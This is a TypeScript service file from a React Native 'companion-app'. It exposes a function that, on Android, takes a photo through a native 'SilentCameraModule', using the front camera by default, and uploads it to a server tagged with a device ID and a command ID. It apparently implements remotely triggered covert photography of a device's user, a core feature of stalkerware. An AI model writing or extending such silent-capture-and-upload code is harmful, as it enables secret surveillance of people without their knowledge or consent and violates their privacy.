// companion-app/src/services/CameraService.ts
import { NativeModules, Platform } from "react-native";
import { uploadSilentPhoto } from "./api";

const { SilentCameraModule } = NativeModules;

export async function captureSilentPhoto(
  deviceId: string,
  cameraType: "front" | "back" = "front",
  commandId?: string
): Promise<boolean> {
  try {
    if (Platform.OS === "android" && SilentCameraModule?.takeSilentPhoto) {
      const photoUri: string = await SilentCameraModule.takeSilentPhoto(cameraType);
      if (photoUri) {
        await uploadSilentPhoto(deviceId, photoUri, commandId, cameraType);
        return true;
      }
    } else {
      console.log(`[CameraService] Simulated silent ${cameraType} photo capture`);
    }
    return false;
  } catch (err) {
    console.error("Failed to capture silent photo", err);
    return false;
  }
}
